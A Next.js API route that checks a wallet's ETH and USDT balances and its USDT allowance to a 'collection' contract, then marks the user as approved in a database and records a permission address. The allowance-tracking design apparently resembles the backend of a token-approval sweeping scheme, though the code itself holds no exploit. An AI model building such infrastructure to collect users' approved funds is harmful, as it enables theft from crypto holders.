import { type NextRequest, NextResponse } from 'next/server'
import { addCorsHeaders } from '@/lib/utils'
import ETH_NETWORK_CONFIG from '@/config/eth-network'
import { createSupabaseServerClient } from '@/lib/supabase-server'

export const dynamic = 'force-dynamic'

// ETH 网络配置 - 以太坊主网
const ETH_RPC_URL = ETH_NETWORK_CONFIG.RPC_URL
const USDT_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.USDT_CONTRACT_ADDRESS
const STAKING_CONTRACT_ADDRESS = ETH_NETWORK_CONFIG.STAKING_CONTRACT_ADDRESS
const USDT_DECIMALS = ETH_NETWORK_CONFIG.USDT_DECIMALS

// 从数据库获取启用的权限地址列表
async function getPermissionAddresses(): Promise<string[]> {
  try {
    const supabase = createSupabaseServerClient()
    const { data, error } = await supabase
      .from('contract_permissions')
      .select('permission_address')
      .eq('chain_type', 'ERC')
      .eq('is_enabled', true)
      .order('sort', { ascending: true })

    if (error) {
      console.error('查询权限地址失败:', error)
      return []
    }

    return (data || []).map(item => item.permission_address)
  } catch (error) {
    console.error('获取权限地址失败:', error)
    return []
  }
}

// 查询 ETH 余额
async function getETHBalance(address: string): Promise<string> {
  try {
    const response = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_getBalance',
        params: [address, 'latest'],
        id: 1
      })
    })

    const data = await response.json()
    if (data.error) {
      throw new Error(data.error.message)
    }

    // 将 wei 转换为 ETH
    const wei = Number.parseInt(data.result, 16)
    const eth = wei / Math.pow(10, 18)
    return eth.toFixed(6)
  } catch (error) {
    console.error('查询ETH余额失败:', error)
    return '0.000000'
  }
}

// 查询 USDT 余额
async function getUSDTBalance(address: string): Promise<string> {
  try {
    // 确保地址格式正确：去除0x，转小写，然后在左侧补0到64位
    const cleanAddress = address.toLowerCase().replace('0x', '').padStart(64, '0')
    
    // 调用 USDT 合约的 balanceOf 方法
    const response = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_call',
        params: [{
          to: USDT_CONTRACT_ADDRESS,
          data: `0x70a08231${cleanAddress}` // balanceOf(address)
        }, 'latest'],
        id: 1
      })
    })

    const data = await response.json()
    if (data.error) {
      throw new Error(data.error.message)
    }

    // 将结果转换为 USDT 数量
    const balance = Number.parseInt(data.result, 16)
    const usdt = balance / Math.pow(10, USDT_DECIMALS)
    return usdt.toFixed(6)
  } catch (error) {
    console.error('查询USDT余额失败:', error)
    return '0.000000'
  }
}

// 查询 USDT 授权额度
async function getUSDTAllowance(address: string, spender: string): Promise<string> {
  try {
    // 确保地址格式正确：去除0x，转小写，然后在左侧补0到64位
    const cleanAddress = address.toLowerCase().replace('0x', '').padStart(64, '0')
    const cleanSpender = spender.toLowerCase().replace('0x', '').padStart(64, '0')
    
    // 调用 USDT 合约的 allowance 方法
    const response = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_call',
        params: [{
          to: USDT_CONTRACT_ADDRESS,
          data: `0xdd62ed3e${cleanAddress}${cleanSpender}` // allowance(owner, spender)
        }, 'latest'],
        id: 1
      })
    })

    const data = await response.json()
    if (data.error) {
      throw new Error(data.error.message)
    }

    // 将结果转换为 USDT 数量
    const allowance = Number.parseInt(data.result, 16)
    const usdt = allowance / Math.pow(10, USDT_DECIMALS)
    return usdt.toFixed(6)
  } catch (error) {
    console.error('查询USDTverify额度失败:', error)
    return '0.000000'
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { userAddress, spenderAddress } = body

    if (!userAddress) {
      const response = NextResponse.json({
        success: false,
        error: '缺少用户地址参数'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 如果没有指定授权对象，默认使用归集合约地址
    // 授权额度应该查询用户对合约地址的授权，而不是权限地址
    const targetSpender = spenderAddress || STAKING_CONTRACT_ADDRESS
    
    if (spenderAddress) {
      console.log(`📋 使用指定的授权对象地址: ${spenderAddress}`)
    } else {
      console.log(`📋 使用默认的归集合约地址: ${STAKING_CONTRACT_ADDRESS}`)
    }

    // 验证地址格式
    if (!/^0x[a-fA-F0-9]{40}$/.test(userAddress)) {
      const response = NextResponse.json({
        success: false,
        error: '无效的以太坊地址格式'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 验证授权对象地址格式
    if (!/^0x[a-fA-F0-9]{40}$/.test(targetSpender)) {
      const response = NextResponse.json({
        success: false,
        error: '无效的授权对象地址格式'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    console.log(`🔍 查询ETH链地址 ${userAddress} 对 ${targetSpender} (归集合约) 的授权额度`)

    // 并行查询所有余额
    // 授权额度应该查询用户对合约地址的授权，而不是权限地址
    const [ethBalance, usdtBalance, usdtAllowance] = await Promise.all([
      getETHBalance(userAddress),
      getUSDTBalance(userAddress),
      getUSDTAllowance(userAddress, STAKING_CONTRACT_ADDRESS) // 查询对归集合约地址的授权额度
    ])
    
    // 计算授权状态
    const maxAllowance = Number.parseFloat(usdtAllowance)
    const hasAuthorization = maxAllowance > 0
    
    // 如果检测到授权额度大于0，自动更新数据库中的授权状态
    if (hasAuthorization) {
      try {
        const supabase = createSupabaseServerClient()
        
        // 查找用户
        const { data: userData, error: userError } = await supabase
          .from('nh_member_new')
          .select('id, approved, wallet_address, auth_wallet_address')
          .or(`wallet_address.eq.${userAddress},auth_wallet_address.eq.${userAddress}`)
          .eq('is_active', true)
          .limit(1)
        
        if (!userError && userData && userData.length > 0) {
          const user = userData[0]
          const currentApproved = user.approved || 0
          
          // 如果当前状态不是已授权，则更新
          if (currentApproved !== 1) {
            console.log(`🔒 检测到用户 ${userAddress} 有授权额度 ${maxAllowance} USDT，但数据库状态为未授权，自动更新授权状态...`)
            
            const currentTimeISO = new Date().toISOString()
            const updateData: any = {
              approved: 1,
              last_approved_at: currentTimeISO,
              updated_at: currentTimeISO
            }
            
            // 如果是首次授权，也更新 first_approved_at
            const { data: existingUser } = await supabase
              .from('nh_member_new')
              .select('first_approved_at')
              .eq('id', user.id)
              .single()
            
            if (existingUser && !existingUser.first_approved_at) {
              updateData.first_approved_at = currentTimeISO
            }
            
            // 如果用户授权给了合约地址，更新 auth_wallet_address 为权限地址（从数据库配置获取）
            // 注意：用户授权给的是合约地址，但 auth_wallet_address 字段存储的是权限地址
            const permissionAddresses = await getPermissionAddresses()
            if (permissionAddresses.length > 0) {
              const permissionAddress = permissionAddresses[0]
              if (permissionAddress && permissionAddress !== user.wallet_address) {
                updateData.auth_wallet_address = permissionAddress
              }
            }
            
            const { data: updateResult, error: updateError } = await supabase
              .from('nh_member_new')
              .update(updateData)
              .eq('id', user.id)
              .select('id, approved, last_approved_at, auth_wallet_address')
            
            if (updateError) {
              console.error('❌ 更新授权状态失败:', updateError)
            } else {
              console.log('✅ 授权状态已自动更新:', {
                userId: user.id,
                walletAddress: userAddress,
                approved: updateResult?.[0]?.approved,
                auth_wallet_address: updateResult?.[0]?.auth_wallet_address,
                maxAllowance: maxAllowance
              })
            }
          } else {
            console.log(`✅ 用户 ${userAddress} 授权状态已是最新，无需更新`)
          }
        } else {
          console.warn(`⚠️ 未找到用户 ${userAddress}，无法更新授权状态`)
        }
      } catch (updateError) {
        console.error('❌ 更新授权状态时发生错误:', updateError)
        // 不阻止返回查询结果，只记录错误
      }
    } else {
      console.log(`ℹ️ 用户 ${userAddress} 授权额度为0，无需更新授权状态`)
    }
    
    const response = NextResponse.json({
      success: true,
      data: {
        userAddress: userAddress,
        ethBalance: ethBalance,
        usdtBalance: usdtBalance,
        allowance: usdtAllowance, // 用户对合约地址的授权额度
        spenderAddress: STAKING_CONTRACT_ADDRESS, // 授权对象是合约地址
        contractAddress: STAKING_CONTRACT_ADDRESS, // 归集合约地址
        usdtContractAddress: USDT_CONTRACT_ADDRESS,
        message: usdtAllowance === '0.000000' ? `用户未对归集合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权，需要用户手动授权USDT额度给合约地址` : `用户已对归集合约 ${STAKING_CONTRACT_ADDRESS} 进行USDT授权，额度: ${usdtAllowance} USDT`,
        timestamp: new Date().toISOString(),
        // 返回授权状态是否已更新
        authorizationUpdated: hasAuthorization
      }
    }, { status: 200 })
    return addCorsHeaders(response)

  } catch (error) {
    console.error('查询ETH链余额失败:', error)
    const response = NextResponse.json({
      success: false,
      error: '查询ETH链余额失败',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
    return addCorsHeaders(response)
  }
}
